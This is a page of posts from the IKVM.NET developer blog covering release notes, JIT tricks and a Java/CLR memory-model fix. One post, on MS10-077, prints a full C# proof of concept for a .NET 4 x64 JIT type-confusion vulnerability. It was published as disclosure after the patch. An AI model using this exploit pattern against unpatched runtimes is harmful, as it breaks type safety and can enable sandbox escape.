	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Several bug fixes. I also figured out a way to workaround an annoying <A href="https://connect.microsoft.com/VisualStudio/feedback/details/566946/x64-jit-optimization-bug">.NET 4 x64 JIT bug</A> without any significant performance impact. Marek Safar has started on porting gmcs to IKVM.Reflection and that triggered some IKVM.Reflection bug fixes and improvements.</P>
<UL>
<LI>Fixed regression in Throwable.printStackTrace(). Exception cause in stack trace should use Throwable.toString() not System.Exception.ToString().</LI>
<LI>Add support for serializing .NET exceptions in Java. We don't serialize the actual object, but a placeholder instead, to avoid having to implement full .NET serialization interop.</LI>
<LI>File.lastModified() should return 0 for non-existing files. Fix for #3111432. Thanks to Stephen White for the patch.</LI>
<LI>Added workaround for <A href="https://connect.microsoft.com/VisualStudio/feedback/details/566946/x64-jit-optimization-bug">.NET 4 x64 JIT bug</A>. </LI>
<LI>Optimized thread creation.</LI>
<LI>Optimized ProtectionDomains created for .NET assemblies to be more lazy.</LI>
<LI>Made assembly Java class loader construction lazy.</LI>
<LI>Removed trace messages that don't add much value but do cause the tracer to needlessly read configuration data early in initialization.</LI>
<LI>Fixed AccessController.doPrivileged() bug that caused context to be ignored.</LI>
<LI>Removed implementation specific methods from top of stack trace for threads started from Java.</LI>
<LI>UnauthorizedAccessException caused by already existing file or directory should cause createFileExclusively() to return false instead of throwing an exception.</LI>
<LI>File.canWrite() should always return true for directories (on Windows).</LI>
<LI>Fixed regression. Don't call GetIPv6Properties() if IPv6 isn't available.</LI>
<LI>AWT fixes.</LI>
<LI>IKVM.Reflection: Added IKVM.Reflection.Missing type. Thanks to Marek Safar for pointing this out.</LI>
<LI>IKVM.Reflection: Fixed ParameterInfo.RawDefaultValue to return Missing.Value if the parameter is optional, but doesn't have a default and to return null, if the parameter isn't optional (and doesn't have a default).</LI>
<LI>IKVM.Reflection: Added AssemblyBuilder.__DefineIconResource() API.</LI>
<LI>Added -win32icon:&lt;file&gt; option to ikvmc.</LI>
<LI>IKVM.Reflection: Added ModuleBuilder.__Save() to support -target:module option better.</LI>
<LI>Changed ikvmc to use new ModuleBuilder.__Save() instead of workaround of deleting the manifest module after saving the assembly.</LI>
<LI>Added support for assembly custom attributes in combination with -target:module.</LI>
<LI>IKVM.Reflection: Added AssemblyBuilder.__AddModule() to allow pre-existing modules to be linked in.</LI>
<LI>IKVM.Reflection: Fixed RawModule.GetReferencedAssemblies() to work for non-manifest modules as well.</LI>
<LI>IKVM.Reflection: Added API to query placeholder assembly custom attributes in a module.</LI>
<LI>Fixed Thread.stop() race condition.</LI>
<LI>Implemented java.awt.Font.createFont().</LI>
<LI>Fixed .NET 4 security&nbsp;attribute regressions.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.3987.zip"><STRONG>ikvmbin-0.45.3987.zip</STRONG></A><BR></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/01/2010 09:46:41 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1a2d289a-8394-4779-9056-aefeb101b3ba"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1a2d289a-8394-4779-9056-aefeb101b3ba">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 21 November 2010</h2></div>
<div class="newsItems"><a name="a5967637c-d1ed-4b10-9442-212e17f5da17"></a><div class="entry">
	<h3 class="entryTitle">How to Detect if a Method is Overridden</h3>
	<div class="entryBody">
		<P>Suppose you want to know if (the class of) a particular object overrides a virtual method. For an example of this see OpenJDK's&nbsp;<A href="http://hg.openjdk.java.net/jdk6/jdk6/jdk/file/5672a2be515a/src/share/classes/java/lang/Thread.java">Thread.isCCLOverriden()</A>&nbsp;(line 1573).</P>
<P>In Java the obvious way to do this would be to use reflection. On the CLR there is another way that is both more accurate<SUP>1</SUP> and more efficient.</P>
<P>Here's the MSIL method from IKVM's java.lang.Thread.isCCLOverridden() implementation:</P><PRE>.method private hidebysig static bool isCCLOverridden(class java.lang.Thread A_0) cil managed
{
  ldftn      instance class java.lang.ClassLoader java.lang.Thread::getContextClassLoader()
  ldarg.0
  ldvirtftn  instance class java.lang.ClassLoader java.lang.Thread::getContextClassLoader()
  ceq
  ldftn      instance void java.lang.Thread::setContextClassLoader(class java.lang.ClassLoader)
  ldarg.0
  ldvirtftn  instance void java.lang.Thread::setContextClassLoader(class java.lang.ClassLoader)
  ceq
  and
  ldc.i4.0
  ceq
  ret
}</PRE>
<P>Instead of running a zillion instructions and accessing a lot of cold data for reflection, this simply leverages the information the JIT already has about virtual methods.</P>
<P>Here's the x86 code this turns into:</P><PRE>  push        ebp 
  mov         ebp,esp 
  push        esi 
  push        ebx 
  mov         esi,ecx 
  push        258F58h 
  mov         ecx,esi 
  mov         edx,259240h 
  call        JIT_VirtualFunctionPointer
  mov         edx,25DCA0h 
  cmp         eax,edx 
  sete        bl 
  movzx       ebx,bl 
  push        2591A0h 
  mov         ecx,esi 
  mov         edx,259240h 
  call        JIT_VirtualFunctionPointer
  mov         edx,25DCB0h 
  cmp         eax,edx 
  sete        al 
  movzx       eax,al 
  and         ebx,eax 
  sete        al 
  movzx       eax,al 
  pop         ebx 
  pop         esi 
  pop         ebp 
  ret</PRE>
<P>To get an idea what JIT_VirtualFunctionPointer does, take a look at the <A href="http://www.koders.com/cpp/fid11A72AA0BEFC6FC3C6A0B7421F7F275BBAC10B8F.aspx#L3903">Shared Source CLI</A>.</P>
<P>On the CLR, in the common case it only executes about 40 instructions.</P>
<P>The downside to this method is that it only works if you have an object instance. Although you could use FormatterServices.GetUninitializedObject() to create an instance.</P>
<P><STRONG>Why Optimize This?</STRONG></P>
<P>In the OpenJDK code, isCCLOverridden() is only called if a SecurityManager is installed, but I wanted to use it always to avoid calling getContextClassLoader() during thread construction, because that would trigger the system class loader to be constructed and I my long term goal for IKVM is to make initialization more lazy to reduce the huge startup overhead.</P>
<P><SUP>
<P>
<HR id=null>
1</SUP>This method is more accurate (on the CLR) because you don't need to worry about non-virtual methods or virtual methods that are <EM>new </EM>(and hence don't override the base class virtual method) or explicit overrides that override a method but have a different name.<BR></P>
<P><STRONG>Update: See </STRONG><A href="/PermaLink.aspx?guid=b73c4889-9ab4-4dfe-a203-e3767a8c2d08"><STRONG>this article</STRONG></A><STRONG> for a caveat.</STRONG></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/21/2010 11:36:21 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5967637c-d1ed-4b10-9442-212e17f5da17"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5967637c-d1ed-4b10-9442-212e17f5da17">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 17 November 2010</h2></div>
<div class="newsItems"><a name="a2c280f7e-366d-48f2-8363-7a37c192bf8a"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Time for a new snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Added support for using MethodImplAttribute as a Java annotation.</LI>
<LI>Fixed class name resolution for xml remapping instructions.</LI>
<LI>Many AWT fixes.</LI>
<LI>Fixed xml remapper to interpret empty sig attribute on call as zero length argument list.</LI>
<LI>Added memory barrier after volatile stores.</LI>
<LI>Added optimization to remove redundant memory barriers.</LI>
<LI>Changed default assembly class loader instantiation to avoid security manager check.</LI>
<LI>Fixed ikvm.exe -D property name parsing to accept properties with equals sign in the name.</LI>
<LI>Fixed JdbcOdbc provider to use Invariant Culture for Decimal/BigDecimal conversion.</LI>
<LI>Fixed column type mapping bugs in JdbcOdbcResultSetMetaData.</LI>
<LI>Fixed resource (and virtual class file) loading regression that caused loading resources from assemblies with an underscore in the name to fail. </LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.45.3973.zip">ikvmbin-0.45.3973.zip</A><BR></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/17/2010 09:08:33 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2c280f7e-366d-48f2-8363-7a37c192bf8a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2c280f7e-366d-48f2-8363-7a37c192bf8a">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 11 November 2010</h2></div>
<div class="newsItems"><a name="a3077a509-7189-46b3-926b-468d9b01645e"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.36 Update 3</h3>
	<div class="entryBody">
		<P>On request of an IKVM.NET user still stuck on .NET 1.1 the memory model fix has been backported to 0.36.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.36.0.14.</LI>
<LI>Emit a memory barrier after volatile stores.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.14.zip">ikvmbin-0.36.0.14.zip</A><BR>Sources (+ binaries): <A href="http://www.frijters.net/ikvm-0.36.0.14.zip">ikvm-0.36.0.14.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/11/2010 07:09:06 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3077a509-7189-46b3-926b-468d9b01645e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3077a509-7189-46b3-926b-468d9b01645e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 01 November 2010</h2></div>
<div class="newsItems"><a name="aacb57d2a-c07a-4838-909a-3d073bdbfdf5"></a><div class="entry">
	<h3 class="entryTitle">C# Async CTP</h3>
	<div class="entryBody">
		<P>Last week at the PDC Microsoft released a CTP of the upcoming C# (and VB.NET) async feature. When you install the <A href="http://www.microsoft.com/downloads/en/details.aspx?FamilyID=18712f38-fcd2-4e9f-9028-8373dc5732b2&amp;displaylang=en">Async CTP</A> and run the code below with the current IKVM.NET release you'll see something like this:</P>
<P style="BACKGROUND-COLOR: black; FONT-FAMILY: 'Courier New', Courier, monospace; COLOR: #c0c0c0">7<BR>Downloaded 64803 bytes<BR>13</P>
<P>This means that after the async operation completed the method resumed on another thread. However, if you get the current IKVM.NET code from cvs, you'll see:</P>
<P style="BACKGROUND-COLOR: black; FONT-FAMILY: 'Courier New', Courier, monospace; COLOR: #c0c0c0">7<BR>Downloaded 64803 bytes<BR>7</P>
<P>Via the magic of <A href="http://msdn.microsoft.com/en-us/library/system.threading.synchronizationcontext.aspx">SynchronizationContext</A> the method now resumes on the AWT event thread, if the await happened on that thread.</P>
<P>Here's the demo:</P>
<P><CODE>using System;<BR>using System.Threading;<BR>using System.Net;<BR>using java.awt;<BR>using java.awt.@event;<BR><BR>class AsyncDemo : Frame, ActionListener<BR>{<BR>&nbsp; AsyncDemo()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; var button = new Button("Click Me");<BR>&nbsp;&nbsp;&nbsp; button.addActionListener(this);<BR>&nbsp;&nbsp;&nbsp; add(button);<BR>&nbsp;&nbsp;&nbsp; pack();<BR>&nbsp;&nbsp;&nbsp; setVisible(true);<BR>&nbsp; }<BR><BR>&nbsp; public <SPAN class=auto-style1><FONT color=#0000ff>async</FONT></SPAN> void actionPerformed(ActionEvent ae)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(Thread.CurrentThread.ManagedThreadId);<BR>&nbsp;&nbsp;&nbsp; var wc = new WebClient();<BR>&nbsp;&nbsp;&nbsp; var data = <SPAN class=auto-style1><FONT color=#0000ff>await</FONT></SPAN> wc.DownloadDataTaskAsync("http://weblog.ikvm.net/");<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine("Downloaded {0} bytes", data.Length);<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(Thread.CurrentThread.ManagedThreadId);<BR>&nbsp; }<BR><BR>&nbsp; static void Main()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; new AsyncDemo();<BR>&nbsp; }<BR>}</CODE></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/01/2010 15:57:38 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=acb57d2a-c07a-4838-909a-3d073bdbfdf5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=acb57d2a-c07a-4838-909a-3d073bdbfdf5">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 26 October 2010</h2></div>
<div class="newsItems"><a name="a7dc34fd3-215d-467d-a331-e1de9023e0d1"></a><div class="entry">
	<h3 class="entryTitle">How to Hack Your Own JIT Intrinsic</h3>
	<div class="entryBody">
		<P>Yesterday I wrote about Thread.MemoryBarrier() and some of its performance characteristics. I wanted to do some benchmarking to see whether mfence really is faster than a locked memory operation, but instead of writing a microbenchmark (which I had already done) I wanted to run code that was a little bit more "real". So I came with a hack to allow mfence to be used in managed code. Please note that this is a hack and not something you should use outside of an experimental context. The code is available <A href="http://www.frijters.net/MemoryBarrierHack.cs.txt">here</A>.</P>
<P>The code includes a microbenchmark, but not the "real" benchmark (based on LinkedBlockingQueue) that I used.</P>
<P>I also tested a Pentium 4 class machine and a Core i7. On the Pentium 4 and my Core 2 Duo the mfence wins out signicantly, but on the Core i7 mfence is significantly slower, oddly enough.</P>
<P><STRONG>How the Hack Works</STRONG></P>
<P>The MemoryBarrierHack.cs file contains two classes, __Hack__DoNotUse and Program. The __Hack__DoNotUse class contains the MemoryBarrier method and a static constructor to patch the MemoryBarrier method. The MemoryBarrier method is patched to patch the call site of its caller and replace the call with an <CODE>mfence</CODE> and a <CODE>mov al,<EM>imm8</EM></CODE> as a filler. This means that when you want a memory barrier, you simply call the static method and when that call executes, the first time it will act as a memory barrier (because of the locked memory operation) and also patch the call so that the next time it will be an mfence instruction.</P>
<P>I built a modified IKVM runtime that uses this trick and used that to benchmark the LinkedBlockingQueue. On my system it showed a performance improvement of about 7% with mfence versus .NET 4.0's MemoryBarrier instrinsic.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/26/2010 11:50:03 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7dc34fd3-215d-467d-a331-e1de9023e0d1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7dc34fd3-215d-467d-a331-e1de9023e0d1">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 25 October 2010</h2></div>
<div class="newsItems"><a name="aea28365e-947e-4e00-a969-d8c8a29b3a42"></a><div class="entry">
	<h3 class="entryTitle">Memory Model Fix</h3>
	<div class="entryBody">
		<P>In last week's 0.44.0.6 update I fixed a memory model bug. In retrospect it was a pretty dumb bug, but in my defence, even the easy parts of memory models are still pretty subtle and when I started IKVM.NET both the Java and CLR memory models were not very well documented.</P>
<P>First of all, I should thank Staffan Ulfberg for filing an exceptionally high quality <A href="http://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3086040&amp;group_id=69637">bug report</A>.</P>
<P><STRONG>Finding the Problem</STRONG></P>
<P>After spending some quality time in Windbg looking at the crash dump and with the java.util.concurrent sources, I was eventually able to reproduce the problem on a single CPU quad core Xeon (but not on my Core 2 laptop). After it was reproducable I started pruning the repro to find the troublespot and eventually found this method:</P>
<P><STRONG>java.util.concurrent.AbstractQueuedSynchronizer.java<BR></STRONG><CODE>public final boolean release(int arg) {<BR>&nbsp; if (tryRelease(arg)) {<BR>&nbsp;&nbsp;&nbsp; Node h = head;<BR>&nbsp;&nbsp;&nbsp; if (h != null &amp;&amp; h.waitStatus != 0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unparkSuccessor(h);<BR>&nbsp;&nbsp;&nbsp; return true;<BR>&nbsp; }<BR>&nbsp; return false;<BR>}</CODE></P>
<P>My pruned version looked like this:</P>
<P><CODE>public final void release() {<BR>&nbsp; state = 0;<BR>&nbsp;&nbsp;Node h = head;<BR>&nbsp;&nbsp;if (h != null &amp;&amp; h.waitStatus != 0)<BR>&nbsp;&nbsp;&nbsp; unparkSuccessor(h);<BR>}</CODE></P>
<P>Both <CODE>state</CODE> and <CODE>head</CODE> are volatile fields. With this modified version the hang usually happened with in a second and I had also added a timeout to <CODE><A href="http://download.oracle.com/javase/6/docs/api/java/util/concurrent/locks/LockSupport.html#park(java.lang.Object)">park</A></CODE> so the problem could be seen repeatedly without restarting the process. After seeing this and thinking about it for a bit, I realized that if the read of <CODE>head</CODE> could be reordered with the write of <CODE>state</CODE>, that could cause the observed hang. To test that theory, I used Windbg to patch the running code to add an <CODE>sfence</CODE> instruction after the <CODE>state = 0</CODE> store. That did indeed make the problem go away and replacing the <CODE>sfence</CODE> with three <CODE>nop</CODE> instructions made it reappear.</P>
<P>Time to read up on the memory models.</P>
<P><STRONG>Java Memory Model</STRONG></P>
<P>For the Java memory model, the <A href="http://g.oswego.edu/dl/jmm/cookbook.html">JSR 133 Cookbook</A> is a good place to start. It has a nice table that confirms that the reordering isn't allowed in Java:</P>
<P>
<TABLE border=1 cellSpacing=1 cellPadding=1>
<TBODY>
<TR>
<TD align=center><B>Can Reorder</B> </TD>
<TD colSpan=4 align=center><EM>2nd operation</EM> </TD></TR>
<TR>
<TD><EM>1st operation</EM> </TD>
<TD>Normal Load<BR>Normal Store </TD>
<TD>Volatile Load <BR>MonitorEnter </TD>
<TD>Volatile Store <BR>MonitorExit </TD></TR>
<TR>
<TD>Normal Load<BR>Normal Store </TD>
<TD><BR></TD>
<TD><BR></TD>
<TD>No </TD></TR>
<TR>
<TD>Volatile Load <BR>MonitorEnter </TD>
<TD>No </TD>
<TD>No </TD>
<TD>No </TD></TR>
<TR>
<TD>Volatile store <BR>MonitorExit </TD>
<TD><BR></TD>
<TD style="BACKGROUND-COLOR: #ffff66">No </TD>
<TD>No </TD></TR></TBODY></TABLE></P>
<P>The yellow box clearly says No :-)</P>
<P><STRONG>CLR Memory Model</STRONG></P>
<P>The CLR memory model is summarized nicely in <A href="http://www.bluebytesoftware.com/blog/2007/11/10/CLR20MemoryModel.aspx">this blog post</A> by Joe Duffy and he explicitly calls out: <EM>"With this model, the only true case where you&#8217;d truly need the strength of a full-barrier provided by Rule 4 is to prevent reordering in the case where a store is followed by a volatile load. Without the barrier, the instructions may reorder."</EM></P>
<P>So that confirmed that I did indeed need to emit a memory barrier between a volatile store and a subsequent load. I modified the bytecode compiler to emit a call to <CODE><A href="http://msdn.microsoft.com/en-us/library/system.threading.thread.memorybarrier.aspx">Thread.MemoryBarrier()</A></CODE> after every volatile store.</P>
<P><STRONG>CLI Memory Model</STRONG></P>
<P>I explicitly chose not to support the CLI memory model, because it is not very well specified and is impossible to test against. I don't know what memory model Mono implements, but I did find that <A href="https://bugzilla.novell.com/show_bug.cgi?id=648831">Thread.MemoryBarrier() was not implemented for x86</A>.</P>
<P><STRONG>Thread.MemoryBarrier() Implementation Issues</STRONG></P>
<P>I picked <CODE>Thread.MemoryBarrier()</CODE> for 0.44 because it was the easiest and lowest risk fix. An alternative would be to use <CODE>Interlocked.Exchange()</CODE> to write to a volatile field. On .NET 2.0, <CODE>Thread.MemoryBarrier()</CODE> is implemented as a native method that does more work than just the memory barrier, it also polls for GC and acts as a safe point. On .NET 4.0 it has been turned into a JIT intrinsic and the overhead is lower. Unfortunately, on my system, the .NET 4.0 memory barrier is still significantly slower than the HotSpot memory barrier (which uses <CODE>mfence</CODE>), but apparently the trade-off between <CODE>mfence</CODE> and a locked instruction is <A href="http://blogs.sun.com/dave/resource/NHM-Pipeline-Blog-V2.txt">not trivial</A>.</P>
<P><STRONG>Optimization</STRONG> 
<P>In the 0.45 code (where there is now an MSIL optimization step), I added an optimization to remove redundant memory barriers. If multiple volatile stores are done in succession, only the last one will get a memory barrier.</P>
<P><STRONG>Testing</STRONG></P>
<P>Finally, here's a small test that reproduces the problem (on my Core 2 laptop):</P>
<P><CODE>class Rendezvous extends java.util.concurrent.atomic.AtomicInteger {<BR>&nbsp; private static final int PARTIES = 2;<BR><BR>&nbsp; public final void await() {<BR>&nbsp;&nbsp;&nbsp; if (incrementAndGet() == PARTIES) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; compareAndSet(PARTIES, 0);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; while (get() != 0) ;<BR>&nbsp; }<BR>}<BR><BR>public class test {<BR>&nbsp; static volatile int p1;<BR>&nbsp; static volatile int p2;<BR>&nbsp; static volatile int r1;<BR>&nbsp; static volatile int r2;<BR>&nbsp; static final Rendezvous rv1 = new Rendezvous();<BR>&nbsp; static final Rendezvous rv2 = new Rendezvous();<BR><BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; Thread t = new Thread() {<BR><CODE>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </CODE>public void run() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (; ; ) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p1 = 0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rv1.await();<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p1 = 1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r1 = p2;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rv2.await();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; };<BR>&nbsp;&nbsp;&nbsp; t.start();<BR><BR>&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 1000000; i++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p2 = 0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rv1.await();<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p2 = 1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r2 = p1;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rv2.await();<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (r1 == 0 &amp;&amp; r2 == 0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("Oops! i = " + i);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp;&nbsp; t.stop();<BR>&nbsp; }<BR>}</CODE></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/25/2010 08:58:57 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ea28365e-947e-4e00-a969-d8c8a29b3a42"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ea28365e-947e-4e00-a969-d8c8a29b3a42">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 22 October 2010</h2></div>
<div class="newsItems"><a name="ad2f792af-a629-4056-ae86-d7deeaa16a1c"></a><div class="entry">
	<h3 class="entryTitle">MS10-077 Vulnerability Details</h3>
	<div class="entryBody">
		<P>Last week Microsoft released <A href="http://www.microsoft.com/technet/security/Bulletin/MS10-077.mspx">MS10-077</A>. Here are the details.</P>
<P>Coincidentally I found this vulnerability in the .NET 4.0 RC on the day that .NET 4.0 went RTM (April 12, 2010) and the next day confirmed that RTM was also affected and reported it to MSRC.</P>
<P>It's not really a very interesting vulnerability, just a bug in an optimization that the x64 JIT does. Here's the code to exploit it:</P><PRE>using System;
using System.Runtime.CompilerServices;</PRE><PRE>class Union1
{
  internal volatile int i;
  internal volatile int j;
}</PRE><PRE>class Union2
{
  internal volatile object o;
  internal volatile int[] arr;
}</PRE><PRE>class Program
{
  static Union1 union1 = new Union1();
  static Union2 union2;</PRE><PRE>  class Base
  {
    public virtual Base Get()
    {
      return null;
    }
  }</PRE><PRE>  class Derived : Base
  {
    public Union2 i;
  }</PRE><PRE>  class MyDerived : Derived
  {
    public override Base Get()
    {
      return new MyBase();
    }
  }</PRE><PRE>  class MyBase : Base
  {
    object foo = union1;
  }</PRE><PRE>  [MethodImpl(MethodImplOptions.NoInlining)]
  static void x64_JIT_Bug(Derived d)
  {
    Base b = d;
  loop:
    if (b != null)
    {
      if (b is Derived)
      {
        Oops((Derived)b);
      }
      b = b.Get();
      goto loop;
    }
  }</PRE><PRE>  static void Oops(Derived d)
  {
    union2 = d.i;
  }</PRE><PRE>  static void Main()
  {
    x64_JIT_Bug(new MyDerived());
    Console.WriteLine(union1);
    Console.WriteLine(union2);
  }
}</PRE>
<P>The bug is in x64_JIT_Bug. The "b is Derived" test and "(Derived)" cast are incorrectly optimized away.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/22/2010 14:02:12 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d2f792af-a629-4056-ae86-d7deeaa16a1c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d2f792af-a629-4056-ae86-d7deeaa16a1c">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a53f694f0-fdd2-44c2-bafe-8fb09ace3d19"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.44 Update 1 RC 0</h3>
	<div class="entryBody">
		<P>Time for a refresh of 0.44 with some bug fixes.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.44.0.6</LI>
<LI>Backported various build system improvements.</LI>
<LI>Backported IKVM.Reflection ILGenerator exception table sorting bug fix (when running on Mono).</LI>
<LI>Backported Mono 2.8 mcs build workarounds.</LI>
<LI>Backported support for boolean, byte, char and short non-final static field constant attributes.</LI>
<LI>Backported core assembly detection fix.</LI>
<LI>Backported fix to make sure that ikvmc (and ikvmstub) can find assemblies that are part of a multi assembly (shared class loader) group (if the assembly is in the same directory as the main assembly of the group).</LI>
<LI>Backported fix for regression in stack trace printing of .NET (not remapped) exceptions introduced in 0.44. The .NET stack trace should not be included in the message.</LI>
<LI>Backported fix for ikvmc sometimes incorrectly handling InternalsVisibleToAttributes in multi assembly builds.</LI>
<LI>Backported fix for regression introduced with fault handlers. Exception handlers inside fault handlers could be ignored.</LI>
<LI>Backported fix for #3086040. Volatile stores require a memory barrier.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.44.0.6.zip">ikvmbin-0.44.0.6.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.44.0.6.zip">ikvmsrc-0.44.0.6.zip</A>, <A href="http://www.frijters.net/openjdk6-b18-stripped.zip">openjdk6-b18-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/22/2010 10:25:42 (W. Europe Daylight Time, UTC+02:00)&nbsp;
